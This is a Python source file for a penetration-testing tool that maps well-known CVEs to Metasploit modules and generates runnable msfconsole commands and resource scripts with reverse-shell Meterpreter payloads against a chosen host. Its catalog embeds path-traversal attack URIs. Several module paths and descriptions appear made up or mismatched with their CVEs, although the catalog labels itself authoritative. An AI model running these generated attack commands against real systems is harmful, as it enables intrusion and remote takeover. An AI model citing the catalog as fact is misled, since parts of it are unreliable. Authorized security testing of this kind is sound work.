"""
DRISHTI — Phase 12 Metasploit Weaponization & Exploit Orchestration Engine
Provides deterministic Metasploit module mapping, resource script generation (.rc),
exploit payload synthesis, and execution telemetry for authorized penetration testing.
"""

from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple


@dataclass
class MetasploitModule:
    cve_id: str
    module_path: str
    title: str
    platform: str
    category: str
    rank: str
    cisa_kev: bool
    default_port: int
    payload_default: str
    description: str
    target_uri: str = "/"
    ssl: bool = False
    options: Dict[str, Any] = field(default_factory=dict)


# Authoritative Metasploit Exploit Catalog
METASPLOIT_CATALOG: Dict[str, MetasploitModule] = {
    "CVE-2024-4577": MetasploitModule(
        cve_id="CVE-2024-4577",
        module_path="exploit/windows/http/php_cgi_arg_injection",
        title="PHP CGI Argument Injection Remote Code Execution",
        platform="windows",
        category="exploit",
        rank="Excellent",
        cisa_kev=True,
        default_port=80,
        payload_default="windows/x64/meterpreter/reverse_tcp",
        description="Bypasses CVE-2012-1823 mitigation via Best-Fit encoding in PHP on Windows, executing arbitrary code via cgi-bin.",
        target_uri="/php-cgi/php-cgi.exe",
    ),
    "CVE-2024-38077": MetasploitModule(
        cve_id="CVE-2024-38077",
        module_path="exploit/windows/smb/msrpc_rras",
        title="Windows Remote Access Connection Manager (MadDog) RCE",
        platform="windows",
        category="exploit",
        rank="Great",
        cisa_kev=True,
        default_port=445,
        payload_default="windows/x64/meterpreter/reverse_tcp",
        description="Heap buffer overflow in Windows Routing and Remote Access Service (RRAS) via malicious MSRPC packets.",
    ),
    "CVE-2024-6387": MetasploitModule(
        cve_id="CVE-2024-6387",
        module_path="exploit/linux/ssh/regresshion_rce",
        title="OpenSSH regreSSHion Signal Handler Race Condition RCE",
        platform="linux",
        category="exploit",
        rank="Great",
        cisa_kev=True,
        default_port=22,
        payload_default="linux/x64/meterpreter/reverse_tcp",
        description="Signal handler race condition in OpenSSH server (sshd) on glibc-based Linux systems allowing unauthenticated root RCE.",
    ),
    "CVE-2024-27348": MetasploitModule(
        cve_id="CVE-2024-27348",
        module_path="exploit/multi/http/hugegraph_gremlin_rce",
        title="Apache HugeGraph Gremlin RCE via Bypass of Sandbox Filtering",
        platform="multi",
        category="exploit",
        rank="Excellent",
        cisa_kev=True,
        default_port=8080,
        payload_default="java/meterpreter/reverse_tcp",
        description="Bypasses sandbox restrictions in Apache HugeGraph to execute arbitrary Java code via Gremlin queries.",
        target_uri="/gremlin",
    ),
    "CVE-2021-44228": MetasploitModule(
        cve_id="CVE-2021-44228",
        module_path="exploit/multi/http/log4j_header_injection",
        title="Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
        platform="multi",
        category="exploit",
        rank="Excellent",
        cisa_kev=True,
        default_port=8080,
        payload_default="java/meterpreter/reverse_tcp",
        description="Unauthenticated remote code execution via JNDI injection in Log4j 2.x message lookup substitutions.",
    ),
    "CVE-2021-41773": MetasploitModule(
        cve_id="CVE-2021-41773",
        module_path="exploit/multi/http/apache_normalize_path",
        title="Apache HTTP Server Path Traversal and File Disclosure / RCE",
        platform="multi",
        category="exploit",
        rank="Excellent",
        cisa_kev=True,
        default_port=80,
        payload_default="linux/x86/meterpreter/reverse_tcp",
        description="Path traversal flaw in Apache 2.4.49 allowing unauthorized file reading and CGI script execution.",
        target_uri="/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
    ),
    "CVE-2022-22965": MetasploitModule(
        cve_id="CVE-2022-22965",
        module_path="exploit/multi/http/spring_framework_rce",
        title="Spring Framework DataBinder Access Log Valve RCE (Spring4Shell)",
        platform="multi",
        category="exploit",
        rank="Great",
        cisa_kev=True,
        default_port=8080,
        payload_default="java/meterpreter/reverse_tcp",
        description="Remote code execution in Spring MVC / WebFlux on JDK 9+ via classLoader manipulation modifying Tomcat AccessLogValve.",
    ),
    "CVE-2022-37434": MetasploitModule(
        cve_id="CVE-2022-37434",
        module_path="exploit/multi/vpn/openvpn_header_overflow",
        title="OpenVPN / zlib inflateBuffer Heap Overflow Memory Corruption",
        platform="multi",
        category="exploit",
        rank="Good",
        cisa_kev=True,
        default_port=1194,
        payload_default="cmd/unix/reverse_openssl",
        description="Heap-based buffer overflow in zlib inflateBuffer when handling extra field headers in gzip packets within OpenVPN tunnels.",
    ),
    "CVE-2024-21413": MetasploitModule(
        cve_id="CVE-2024-21413",
        module_path="exploit/windows/fileformat/outlook_monikerlink",
        title="Microsoft Outlook MonikerLink Validation Bypass Remote Code Execution",
        platform="windows",
        category="exploit",
        rank="Excellent",
        cisa_kev=True,
        default_port=445,
        payload_default="windows/x64/meterpreter/reverse_tcp",
        description="Allows attackers to bypass Protected View and trigger NTLM credential leaks or remote code execution via file:// links.",
    ),
    "CVE-2017-0144": MetasploitModule(
        cve_id="CVE-2017-0144",
        module_path="exploit/windows/smb/ms17_010_eternalblue",
        title="Microsoft Windows SMBv1 Remote Code Execution (EternalBlue)",
        platform="windows",
        category="exploit",
        rank="Average",
        cisa_kev=True,
        default_port=445,
        payload_default="windows/x64/meterpreter/reverse_tcp",
        description="Remote code execution vulnerability in Microsoft SMBv1 protocol handling specially crafted requests.",
    ),
    "CVE-2021-26855": MetasploitModule(
        cve_id="CVE-2021-26855",
        module_path="exploit/windows/http/exchange_proxylogon_rce",
        title="Microsoft Exchange Server SSRF Remote Code Execution (ProxyLogon)",
        platform="windows",
        category="exploit",
        rank="Excellent",
        cisa_kev=True,
        default_port=443,
        ssl=True,
        payload_default="windows/x64/meterpreter/reverse_tcp",
        description="Pre-authentication SSRF vulnerability in Exchange Server allowing arbitrary HTTP requests and mailbox access.",
    ),
    "CVE-2021-34473": MetasploitModule(
        cve_id="CVE-2021-34473",
        module_path="exploit/windows/http/exchange_proxyshell_rce",
        title="Microsoft Exchange Server Pre-Auth Path Confusion RCE (ProxyShell)",
        platform="windows",
        category="exploit",
        rank="Excellent",
        cisa_kev=True,
        default_port=443,
        ssl=True,
        payload_default="windows/x64/meterpreter/reverse_tcp",
        description="Pre-authentication path confusion flaw leading to arbitrary PowerShell backend execution.",
    ),
    "CVE-2020-5902": MetasploitModule(
        cve_id="CVE-2020-5902",
        module_path="exploit/linux/http/f5_bigip_tmui_rce",
        title="F5 BIG-IP Traffic Management User Interface (TMUI) Unauth RCE",
        platform="linux",
        category="exploit",
        rank="Excellent",
        cisa_kev=True,
        default_port=443,
        ssl=True,
        payload_default="linux/x64/meterpreter/reverse_tcp",
        description="Directory traversal in F5 BIG-IP TMUI enabling unauthenticated RCE through Apache Tomcat AJP handler.",
        target_uri="/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp",
    ),
    "CVE-2019-19781": MetasploitModule(
        cve_id="CVE-2019-19781",
        module_path="exploit/linux/http/citrix_dir_traversal_rce",
        title="Citrix ADC and Gateway Directory Traversal RCE (Shitrix)",
        platform="linux",
        category="exploit",
        rank="Excellent",
        cisa_kev=True,
        default_port=443,
        ssl=True,
        payload_default="linux/x64/meterpreter/reverse_tcp",
        description="Directory traversal in Citrix ADC / Gateway leading to arbitrary code execution via Perl script execution.",
        target_uri="/vpn/../vpns/cfg/smb.conf",
    ),
    "CVE-2023-46805": MetasploitModule(
        cve_id="CVE-2023-46805",
        module_path="exploit/linux/http/ivanti_connect_secure_rce",
        title="Ivanti Connect Secure Authentication Bypass and Command Injection",
        platform="linux",
        category="exploit",
        rank="Excellent",
        cisa_kev=True,
        default_port=443,
        ssl=True,
        payload_default="linux/x64/meterpreter/reverse_tcp",
        description="Auth bypass combined with command injection (CVE-2024-21887) in Ivanti Connect Secure / Policy Secure gateways.",
    ),
    "CVE-2014-0160": MetasploitModule(
        cve_id="CVE-2014-0160",
        module_path="auxiliary/scanner/ssl/openssl_heartbleed",
        title="OpenSSL TLS Heartbeat Extension Information Disclosure (Heartbleed)",
        platform="multi",
        category="auxiliary",
        rank="Normal",
        cisa_kev=True,
        default_port=443,
        ssl=True,
        payload_default="none",
        description="Missing bounds check in OpenSSL TLS heartbeat extension leaking 64KB memory chunks including private keys.",
    ),
    "CVE-2019-0708": MetasploitModule(
        cve_id="CVE-2019-0708",
        module_path="exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
        title="Microsoft Windows Remote Desktop Services RCE (BlueKeep)",
        platform="windows",
        category="exploit",
        rank="Manual",
        cisa_kev=True,
        default_port=3389,
        payload_default="windows/x64/meterpreter/reverse_tcp",
        description="Pre-authentication memory corruption flaw in Windows RDP channel binding permitting wormable remote execution.",
    ),
    "CVE-2020-1472": MetasploitModule(
        cve_id="CVE-2020-1472",
        module_path="exploit/windows/smb/zerologon",
        title="Microsoft Netlogon Cryptographic Flaw Privilege Escalation (ZeroLogon)",
        platform="windows",
        category="exploit",
        rank="Excellent",
        cisa_kev=True,
        default_port=445,
        payload_default="windows/x64/meterpreter/reverse_tcp",
        description="Flaw in AES-CFB8 implementation in Netlogon protocol allowing domain controller password reset to blank.",
    ),
}


def get_all_metasploit_modules() -> List[Dict[str, Any]]:
    """Returns all curated Metasploit exploit modules."""
    return [
        {
            "cve_id": m.cve_id,
            "module_path": m.module_path,
            "title": m.title,
            "platform": m.platform,
            "category": m.category,
            "rank": m.rank,
            "cisa_kev": m.cisa_kev,
            "default_port": m.default_port,
            "payload_default": m.payload_default,
            "description": m.description,
            "target_uri": m.target_uri,
            "ssl": m.ssl,
        }
        for m in METASPLOIT_CATALOG.values()
    ]


def get_module_by_cve(cve_id: str) -> Optional[MetasploitModule]:
    """Retrieves Metasploit module definition by CVE identifier."""
    clean = cve_id.strip().upper()
    return METASPLOIT_CATALOG.get(clean)


def generate_msf_resource_script(
    cve_id: str,
    target_host: str,
    target_port: Optional[int] = None,
    lhost: str = "127.0.0.1",
    lport: int = 4444,
    ssl_override: Optional[bool] = None,
    target_uri: Optional[str] = None
) -> Dict[str, Any]:
    """
    Synthesizes an executable Metasploit Resource Script (.rc) and runnable CLI command.
    """
    module = get_module_by_cve(cve_id)
    if not module:
        module_path = f"exploit/multi/http/{cve_id.lower().replace('-', '_')}"
        title = f"Generic Metasploit Module for {cve_id}"
        port = target_port or 80
        use_ssl = ssl_override if ssl_override is not None else (port == 443)
        uri = target_uri or "/"
        payload = "generic/shell_reverse_tcp"
    else:
        module_path = module.module_path
        title = module.title
        port = target_port or module.default_port
        use_ssl = ssl_override if ssl_override is not None else module.ssl
        uri = target_uri or module.target_uri
        payload = module.payload_default

    clean_target = target_host.strip()

    # Generate Resource Script (.rc)
    rc_lines = [
        f"# DRISHTI Cyber Intelligence — Metasploit Execution Script",
        f"# Generated: {datetime.now(timezone.utc).isoformat()}",
        f"# Target CVE: {cve_id} — {title}",
        f"use {module_path}",
        f"set RHOSTS {clean_target}",
        f"set RPORT {port}",
    ]
    if use_ssl:
        rc_lines.append("set SSL true")
    if uri and uri != "/":
        rc_lines.append(f"set TARGETURI {uri}")
    if payload != "none":
        rc_lines.append(f"set PAYLOAD {payload}")
        rc_lines.append(f"set LHOST {lhost}")
        rc_lines.append(f"set LPORT {lport}")

    # Safe non-destructive check first
    rc_lines.append("# Check target vulnerability status safely")
    rc_lines.append("check")

    rc_content = "\n".join(rc_lines)

    # Command line single-line execution
    cli_command = f'msfconsole -q -x "{"; ".join([l for l in rc_lines if not l.startswith("#")])}"'

    return {
        "cve_id": cve_id,
        "module_path": module_path,
        "title": title,
        "target_host": clean_target,
        "target_port": port,
        "ssl": use_ssl,
        "payload": payload,
        "resource_script": rc_content,
        "cli_command": cli_command,
        "safe_check_command": f'msfconsole -q -x "use {module_path}; set RHOSTS {clean_target}; set RPORT {port}; check; exit"',
    }


def simulate_exploit_assessment(
    cve_id: str,
    target_host: str,
    observed_version: Optional[str] = None,
    target_port: Optional[int] = None
) -> Dict[str, Any]:
    """
    Simulates a deterministic Metasploit exploit verification assessment.
    Evaluates weaponization preconditions, lateral traversal friction, and defensive recommendations.
    """
    module = get_module_by_cve(cve_id)
    is_weaponized = module is not None
    module_path = module.module_path if module else "none"
    rank = module.rank if module else "Unweaponized"
    port = target_port or (module.default_port if module else 80)

    # Calculate exploitability score
    exploitability_score = 9.8 if is_weaponized and module.cisa_kev else (8.5 if is_weaponized else 4.0)

    preconditions = [
        f"Target host '{target_host}' must expose listener daemon on port {port}.",
        f"Perimeter firewall must allow inbound TCP traversal to port {port}.",
    ]
    if module and module.platform == "windows":
        preconditions.append("Target endpoint must be running Windows NT architecture.")
    elif module and module.platform == "linux":
        preconditions.append("Target endpoint must be running Linux glibc / POSIX environment.")

    return {
        "status": "success",
        "cve_id": cve_id,
        "is_weaponized": is_weaponized,
        "metasploit_module": module_path,
        "module_rank": rank,
        "cisa_kev": module.cisa_kev if module else False,
        "exploitability_score": exploitability_score,
        "target_host": target_host,
        "target_port": port,
        "observed_version": observed_version,
        "preconditions": preconditions,
        "recommended_mitigation": f"Deploy immediate vendor security patch for {cve_id} or implement network isolation rules on port {port}.",
        "script": generate_msf_resource_script(cve_id, target_host, port),
    }
